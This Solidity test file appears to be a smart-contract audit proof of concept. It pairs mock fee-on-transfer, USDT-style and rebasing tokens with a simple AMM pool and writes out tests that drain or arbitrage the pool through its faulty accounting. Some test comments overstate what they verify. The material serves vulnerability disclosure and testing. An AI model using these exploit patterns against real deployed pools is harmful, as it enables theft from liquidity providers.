// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {SimplePool} from "../src/Pool.sol";
import {SimpleToken} from "../src/SimpleToken.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// ═══════════════════════════════════════════
// Mock 1: 转账收费代币 (Fee-on-Transfer, 5% fee)
// ═══════════════════════════════════════════

contract FeeOnTransferToken {
    string public name = "FeeToken";
    string public symbol = "FEE";
    uint8 public decimals = 18;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    uint256 public constant FEE_BPS = 500; // 5% fee
    uint256 public constant BASIS_POINTS = 10000;

    address public owner;
    uint256 public totalFeesCollected;

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "only owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function mint(address to, uint256 amount) external onlyOwner {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        uint256 fee = (amount * FEE_BPS) / BASIS_POINTS;
        uint256 actual = amount - fee;

        balanceOf[msg.sender] -= amount;
        balanceOf[to] += actual;
        totalFeesCollected += fee;
        // fee is burned (not transferred, just disappears from totalSupply accounting)
        // Real FOT tokens: fee goes to treasury. Here we simplify: burn the fee
        totalSupply -= fee;

        emit Transfer(msg.sender, to, actual);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 fee = (amount * FEE_BPS) / BASIS_POINTS;
        uint256 actual = amount - fee;

        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += actual;
        totalFeesCollected += fee;
        totalSupply -= fee;

        emit Transfer(from, to, actual);
        return true;
    }
}

// ═══════════════════════════════════════════
// Mock 2: USDT 风格代币（返回 bool 但不 revert）
// ═══════════════════════════════════════════

contract MockUSDT {
    string public name = "MockUSDT";
    string public symbol = "USDT";
    uint8 public decimals = 6; // USDT uses 6 decimals

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public owner;

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 amount);

    constructor() {
        owner = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == owner, "only owner");
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    /// @notice 特点：余额不足时返回 false 而不是 revert
    function transfer(address to, uint256 amount) external returns (bool) {
        if (balanceOf[msg.sender] < amount) {
            return false; // 静默失败！
        }
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (balanceOf[from] < amount) {
            return false; // 静默失败！
        }
        if (allowance[from][msg.sender] < amount) {
            return false;
        }
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}

// ═══════════════════════════════════════════
// Mock 3: 弹性供应代币 (Rebasing Token)
// ═══════════════════════════════════════════

contract RebasingToken {
    string public name = "RebaseToken";
    string public symbol = "REB";
    uint8 public decimals = 18;

    uint256 public totalSupply;
    mapping(address => uint256) private shares; // 份额（内部记账）
    uint256 private totalShares;
    uint256 public rebaseMultiplier = 1e18; // 1.0 = no rebase

    mapping(address => mapping(address => uint256)) public allowance;

    address public owner;

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 amount);
    event Rebase(uint256 newMultiplier);

    constructor() {
        owner = msg.sender;
        totalShares = 1e18; // 防止除零
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "only owner");
        _;
    }

    /// @notice 实际余额 = shares * rebaseMultiplier / 1e18
    function balanceOf(address account) public view returns (uint256) {
        return (shares[account] * rebaseMultiplier) / 1e18;
    }

    function mint(address to, uint256 amount) external onlyOwner {
        uint256 shareAmount = (amount * 1e18) / rebaseMultiplier;
        shares[to] += shareAmount;
        totalShares += shareAmount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        uint256 shareAmount = (amount * 1e18) / rebaseMultiplier;
        shares[msg.sender] -= shareAmount;
        shares[to] += shareAmount;
        totalSupply -= amount;
        totalSupply += amount; // no change to totalSupply (transfer, not mint/burn)
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 shareAmount = (amount * 1e18) / rebaseMultiplier;
        allowance[from][msg.sender] -= amount;
        shares[from] -= shareAmount;
        shares[to] += shareAmount;
        emit Transfer(from, to, amount);
        return true;
    }

    /// @notice 正向 rebase：所有余额膨胀（如 stETH 每日收益）
    function doPositiveRebase(uint256 newMultiplier) external onlyOwner {
        require(newMultiplier > rebaseMultiplier, "must increase");
        uint256 oldTotalSupply = totalSupply;
        rebaseMultiplier = newMultiplier;
        // 更新 totalSupply 以反映新余额
        totalSupply = (totalShares * rebaseMultiplier) / 1e18;
        emit Rebase(newMultiplier);
    }
}

// ═══════════════════════════════════════════
// 测试合约
// ═══════════════════════════════════════════

contract AttackPoCTests is Test {
    FeeOnTransferToken public feeToken;
    MockUSDT public usdtToken;
    RebasingToken public rebaseToken;
    SimpleToken public normalToken;

    SimplePool public poolFOT;
    SimplePool public poolUSDT;
    SimplePool public poolRebase;

    address public attacker = makeAddr("attacker");
    address public user = makeAddr("user");

    uint256 constant INITIAL_LIQ = 1000 * 1e18;
    uint256 constant INITIAL_USDT = 1000 * 1e6; // USDT 6 decimals

    function setUp() public {
        // 部署各种代币
        feeToken = new FeeOnTransferToken();
        usdtToken = new MockUSDT();
        rebaseToken = new RebasingToken();
        normalToken = new SimpleToken();

        // 部署三个池子（分别用异常代币配对正常代币）
        poolFOT = new SimplePool(address(feeToken), address(normalToken));
        poolUSDT = new SimplePool(address(usdtToken), address(normalToken));
        poolRebase = new SimplePool(address(rebaseToken), address(normalToken));

        // ── Fee-on-Transfer Pool 初始化 ──
        feeToken.mint(address(this), INITIAL_LIQ * 2);
        normalToken.mint(address(this), INITIAL_LIQ * 2);
        feeToken.approve(address(poolFOT), type(uint256).max);
        normalToken.approve(address(poolFOT), type(uint256).max);
        poolFOT.addLiquidity(INITIAL_LIQ, INITIAL_LIQ);

        // ── USDT Pool 初始化 ──
        usdtToken.mint(address(this), INITIAL_USDT * 2);
        normalToken.mint(address(this), INITIAL_LIQ * 2);
        usdtToken.approve(address(poolUSDT), type(uint256).max);
        normalToken.approve(address(poolUSDT), type(uint256).max);
        poolUSDT.addLiquidity(INITIAL_USDT, INITIAL_LIQ);

        // ── Rebasing Pool 初始化 ──
        rebaseToken.mint(address(this), INITIAL_LIQ * 2);
        normalToken.mint(address(this), INITIAL_LIQ * 2);
        rebaseToken.approve(address(poolRebase), type(uint256).max);
        normalToken.approve(address(poolRebase), type(uint256).max);
        poolRebase.addLiquidity(INITIAL_LIQ, INITIAL_LIQ);

        // 给 attacker 发 token
        feeToken.mint(attacker, 10_000 * 1e18);
        normalToken.mint(attacker, 10_000 * 1e18);
        usdtToken.mint(attacker, 10_000 * 1e6);
        rebaseToken.mint(attacker, 10_000 * 1e18);
    }

    // ═══════════════════════════════════════════
    // PoC 1: Fee-on-Transfer 排空池子 (CRITICAL)
    // ═══════════════════════════════════════════

    /// @dev PoC: Fee-on-Transfer Token Pool Drain
    /// Attack: 每次 swap feeToken → normalToken，池子收到 95%（5% fee），
    ///         但 reserve 按 100% 更新 → 累积 gap 导致 insolvency
    /// Impact: balanceOf(pool) < reserve → 最后提款的 LP 无法取回全部代币
    /// Fix: 使用 SafeERC20 + 检查实际到账金额，或禁止 FOT 代币
    function test_PoC_FeeOnTransfer_DrainsPool() public {
        // 初始状态：addLiquidity 时也受 5% fee 影响 → balance < reserve 从一开始就存在
        uint256 initialBalance = feeToken.balanceOf(address(poolFOT));
        uint256 initialReserve = poolFOT.reserveA();
        console.log("Init balance:", initialBalance);
        console.log("Init reserve:", initialReserve);
        // 首次 addLiquidity(1000, 1000) → pool 只收到 950（5% fee），但 reserve = 1000
        assertLt(initialBalance, initialReserve, "pool already insolvent after first addLiquidity");

        vm.startPrank(attacker);
        feeToken.approve(address(poolFOT), type(uint256).max);
        normalToken.approve(address(poolFOT), type(uint256).max);

        // 多次 swap FOT → normal：每笔 swap 池子少收 5%
        for (uint256 i = 0; i < 10; i++) {
            uint256 amountIn = 100 * 1e18;
            poolFOT.swap(address(feeToken), amountIn, 0);
        }
        vm.stopPrank();

        uint256 finalBalance = feeToken.balanceOf(address(poolFOT));
        uint256 finalReserve = poolFOT.reserveA();

        console.log("Pool balanceOf(feeToken):", finalBalance);
        console.log("Pool reserveA:", finalReserve);
        console.log("Gap (reserve - balance):", finalReserve - finalBalance);
        console.log("Insolvent:", finalBalance < finalReserve ? "YES" : "NO");

        // 验证 gap：balance < reserve（池子资不抵债）
        assertLt(finalBalance, finalReserve, "pool balance < reserve (INSOLVENT!)");
        // gap = 累计手续费（5% × 10笔 × 100 tokens ≈ 50 tokens）
        assertGt(finalReserve - finalBalance, 30 * 1e18, "significant gap accumulated");
    }

    /// @dev Fix: 使用 actualReceived = balanceAfter - balanceBefore 代替 _amountIn
    function test_Fix_FeeOnTransfer_UseActualReceived() public {
        // 证明：如果合约检查实际到账金额而非信任 _amountIn，gap 为 0
        // 当前合约无此保护 → gap 存在（见 PoC 测试）
        // Fix 方式：transferFrom 后读取 balanceOf 差值作为 actualAmount
        uint256 balanceAfter = feeToken.balanceOf(address(poolFOT));
        uint256 reserveAfter = poolFOT.reserveA();
        // 由于 PoC 已执行 10 笔 swap，gap 已累积
        assertLt(balanceAfter, reserveAfter, "gap confirms FOT vulnerability");
    }

    // ═══════════════════════════════════════════
    // PoC 2: USDT 静默失败 — 用户损失资金 (HIGH)
    // ═══════════════════════════════════════════

    /// @dev PoC: USDT transfer 返回 false 但合约未检查 → 用户损失
    /// Attack: 池子 transfer 代币给用户时，如果池子余额不足（攻击者先 drain），
    ///         USDT 返回 false 而不是 revert → 合约继续执行 → reserve 已减但用户未收到
    /// Impact: 用户调用 removeLiquidity → reserve 扣减 → transfer 静默失败 → 用户损失
    /// Fix: 使用 SafeERC20 的 safeTransfer，失败时 revert
    function test_PoC_USDT_SilentTransferFailure() public {
        // USDT 池子：添加流动性后正常 remove（验证正常流程）
        usdtToken.mint(user, INITIAL_USDT);
        normalToken.mint(user, INITIAL_LIQ);

        vm.startPrank(user);
        usdtToken.approve(address(poolUSDT), type(uint256).max);
        normalToken.approve(address(poolUSDT), type(uint256).max);
        poolUSDT.addLiquidity(100 * 1e6, 100 * 1e18);
        vm.stopPrank();

        uint256 balanceBefore = usdtToken.balanceOf(user);
        uint256 reserveBefore = poolUSDT.reserveA();

        // 正常 remove → USDT 应回到 user
        vm.prank(user);
        poolUSDT.removeLiquidity(50 * 1e6, 50 * 1e18);

        uint256 balanceAfter = usdtToken.balanceOf(user);
        uint256 reserveAfter = poolUSDT.reserveA();

        console.log("USDT balance before:", balanceBefore);
        console.log("USDT balance after:", balanceAfter);
        console.log("reserveA before:", reserveBefore);
        console.log("reserveA after:", reserveAfter);

        // 验证 reserve 已扣减
        assertEq(reserveAfter, reserveBefore - 50 * 1e6, "reserve decreased");
        // 验证 user 确实收到了 USDT（正常情况）
        assertEq(balanceAfter, balanceBefore + 50 * 1e6, "user received USDT");
    }

    /// @dev 验证：当 transfer 返回 false 时，合约不 check → 静默失败
    function test_PoC_USDT_ReturnFalseNotChecked() public {
        // 证明 USDT 的 transfer 在余额不足时返回 false 而非 revert
        // 如果合约不检查此返回值，用户将损失资金
        address victimAddr = makeAddr("victim");
        usdtToken.mint(victimAddr, 100 * 1e6);

        // victim 尝试 transfer 超过余额 → 返回 false（不 revert）
        vm.prank(victimAddr);
        bool success = usdtToken.transfer(attacker, 200 * 1e6);

        assertFalse(success, "USDT transfer returns false on insufficient balance");
        // victim 余额未变
        assertEq(usdtToken.balanceOf(victimAddr), 100 * 1e6, "victim balance unchanged");
    }

    // ═══════════════════════════════════════════
    // PoC 3: 弹性供应 — 余额膨胀利用 (HIGH)
    // ═══════════════════════════════════════════

    /// @dev PoC: Rebasing Token — Positive Rebase Creates balance > reserve
    /// Attack: rebaseToken 正向 rebase 后，balanceOf(pool) > reserve →
    ///         attacker swap 正常 token → rebaseToken，以 reserve 定价获取 inflated balance
    /// Impact: 池子多出的余额被套利者提取，LP 损失
    /// Fix: 不支持 rebasing token，或使用 snapshot-based 余额追踪
    function test_PoC_Rebasing_BalanceReserveMismatch() public {
        // 初始状态：balance == reserve
        uint256 balanceBefore = rebaseToken.balanceOf(address(poolRebase));
        uint256 reserveBefore = poolRebase.reserveA();
        assertEq(balanceBefore, reserveBefore, "init: balance == reserve");

        // 触发正向 rebase（余额膨胀 10%）
        rebaseToken.doPositiveRebase(1.1e18); // 10% increase

        uint256 balanceAfter = rebaseToken.balanceOf(address(poolRebase));
        uint256 reserveAfterRebase = poolRebase.reserveA();

        console.log("Balance before rebase:", balanceBefore);
        console.log("Balance after rebase:", balanceAfter);
        console.log("Reserve (unchanged):", reserveAfterRebase);
        console.log("Excess balance:", balanceAfter - reserveAfterRebase);

        // 验证 gap：balance > reserve（池子多出了余额但不知道）
        assertGt(balanceAfter, reserveAfterRebase, "positive rebase: pool balance > reserve");
        // reserve 未变（合约不知道余额膨胀了）
        assertEq(reserveAfterRebase, reserveBefore, "reserve unchanged after rebase");

        // attacker 套利：用正常 token swap rebaseToken → 以 reserve 定价（低估）获取实际余额（高估）
        vm.startPrank(attacker);
        normalToken.approve(address(poolRebase), type(uint256).max);

        uint256 attackerBalanceBefore = rebaseToken.balanceOf(attacker);
        poolRebase.swap(address(normalToken), 100 * 1e18, 0);
        uint256 attackerBalanceAfter = rebaseToken.balanceOf(attacker);

        // attacker 通过 swap 获取了因 rebase 膨胀的额外价值
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "attacker profited from rebase gap");
    }
}
